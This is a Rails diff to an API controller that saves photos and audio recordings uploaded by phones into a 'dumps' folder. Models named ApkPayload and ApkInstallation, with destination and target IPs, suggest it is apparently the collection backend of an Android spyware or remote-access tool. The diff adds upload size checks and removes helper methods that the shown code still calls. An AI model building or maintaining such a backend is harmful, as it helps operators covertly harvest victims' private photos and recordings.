@@ -11,6 +11,8 @@ module Api
         ext = File.extname(params[:file].original_filename).downcase rescue '.jpg'
         allowed_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
         ext = '.jpg' unless allowed_extensions.include?(ext)
+
+        return unless reject_oversize!(params[:file].size, 'photo upload')
         
         filename = "photo_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}#{ext}"
         filepath = Rails.root.join('files', 'dumps', 'photos', filename)
@@ -24,10 +26,12 @@ module Api
       elsif params[:data].present? || params[:photo].present?
         # Base64 encoded image - Android sends as 'photo' key
         base64_data = params[:data] || params[:photo]
+        decoded = Base64.decode64(base64_data)
+        return unless reject_oversize!(decoded.bytesize, 'photo upload')
         filename = "photo_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}.jpg"
         filepath = Rails.root.join('files', 'dumps', 'photos', filename)
         FileUtils.mkdir_p(File.dirname(filepath))
-        File.open(filepath, 'wb') { |f| f.write(Base64.decode64(base64_data)) }
+        File.open(filepath, 'wb') { |f| f.write(decoded) }
         
         smartphone.pictures.create!(
           filename: filename,
@@ -54,6 +58,8 @@ module Api
         ext = File.extname(params[:file].original_filename).downcase rescue '.mp3'
         allowed_extensions = ['.mp3', '.wav', '.ogg', '.m4a', '.aac', '.flac']
         ext = '.mp3' unless allowed_extensions.include?(ext)
+
+        return unless reject_oversize!(params[:file].size, 'audio upload')
         
         filename = "audio_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}#{ext}"
         filepath = Rails.root.join('files', 'dumps', 'audio', filename)
@@ -68,10 +74,12 @@ module Api
       elsif params[:data].present? || params[:audio].present?
         # Base64 encoded audio - Android sends as 'audio' key
         base64_data = params[:data] || params[:audio]
+        decoded = Base64.decode64(base64_data)
+        return unless reject_oversize!(decoded.bytesize, 'audio upload')
         filename = "audio_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}.mp3"
         filepath = Rails.root.join('files', 'dumps', 'audio', filename)
         FileUtils.mkdir_p(File.dirname(filepath))
-        File.open(filepath, 'wb') { |f| f.write(Base64.decode64(base64_data)) }
+        File.open(filepath, 'wb') { |f| f.write(decoded) }
         
         smartphone.recordings.create!(
           filename: filename,
@@ -88,20 +96,5 @@ module Api
       render json: { error: e.message }, status: :unprocessable_entity
     end
     
-    private
-    
-    # Sanitize device_id to prevent path traversal
-    def sanitize_device_id(device_id)
-      device_id.to_s.gsub(/[^a-zA-Z0-9_\-]/, '')
-    end
-    
-    def find_or_create_smartphone(device_id)
-      smartphone = Smartphone.find_by(device_id: device_id)
-      return smartphone if smartphone
-      
-      payload = ApkPayload.first_or_create!(name: 'default', destination_ip: '0.0.0.0', destination_port: '8080')
-      installation = ApkInstallation.first_or_create!(apk_payload: payload, target_ip: device_id, status: 'active')
-      Smartphone.create!(device_id: device_id, name: "Device #{device_id[0..7]}", apk_installation: installation)
-    end
   end
 end
